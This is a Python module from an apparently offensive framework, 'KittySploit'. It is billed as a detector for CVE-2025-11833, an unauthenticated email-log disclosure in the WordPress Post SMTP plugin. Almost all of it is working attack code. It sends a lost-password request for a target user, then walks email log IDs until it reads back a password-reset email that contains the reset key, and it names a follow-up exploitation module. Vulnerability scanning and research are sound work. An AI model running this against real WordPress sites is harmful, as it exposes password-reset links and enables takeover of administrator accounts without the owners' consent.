#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Post SMTP <= 3.6.0 email log disclosure (CVE-2025-11833)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "post-smtp"
_VULN_HIGH = (3, 6, 0)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Post SMTP CVE-2025-11833 detect",
        "description": (
            "Detects unauthenticated email log read via lostpassword + postman_email_log view."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-11833",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-11833"],
        "modules": ["auxiliary/admin/http/post_smtp_cve_2025_11833_email_log_read"],
        "tags": ["web", "scanner", "wordpress", "post-smtp", "disclosure", "cve-2025-11833"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/post_smtp_cve_2025_11833_email_log_read"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    username = OptString("admin", "User for lost-password trigger", required=False)
    log_id_start = OptInteger(1, "First log_id to try", required=False)
    log_id_end = OptInteger(15, "Last log_id to try", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        user = self.username or "admin"
        start, end = int(self.log_id_start or 1), int(self.log_id_end or 15)
        for log_id in range(start, end + 1):
            resp = self.http_request(
                method="POST",
                path=self._join("/wp-login.php"),
                params={
                    "action": "lostpassword",
                    "page": "postman_email_log",
                    "view": "log",
                    "log_id": str(log_id),
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={"user_login": user, "redirect_to": "", "wp-submit": "Get New Password"},
                allow_redirects=False,
            )
            body = resp.text or "" if resp else ""
            if (
                resp
                and int(resp.status_code or 0) == 200
                and "your password, visit the following address:" in body
                and "key=" in body
                and f"Username: {user}" in body
            ):
                self.set_info(
                    severity="critical",
                    reason=f"Post SMTP log_id={log_id} discloses password-reset email",
                    cve="CVE-2025-11833",
                )
                return True
        return False
